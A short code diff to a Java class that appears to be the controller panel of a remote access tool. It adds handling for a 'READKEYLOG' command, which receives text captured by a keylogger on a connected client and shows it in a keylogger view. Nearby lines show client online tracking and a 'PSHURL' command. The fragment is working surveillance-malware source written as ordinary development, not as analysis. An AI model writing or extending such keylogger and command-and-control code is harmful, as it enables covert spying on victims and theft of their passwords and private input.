@@ -57,6 +57,10 @@ class ProcessCommands implements Repository {
                 client.setOnlineStatus("Online");
                 Controller.updateStats();
                 Controller.updateTable();
+            } else if (input.equals("READKEYLOG")){
+                int len = dis.readInt();
+                String content = readFromDis(dis);
+                KeyloggerView.getData().setText(content);
             } else if (input.contains("PSHURL")){
                 //StringBuilder fullContent = new StringBuilder();
                 try{Thread.sleep(100);}catch(InterruptedException e){e.printStackTrace();}
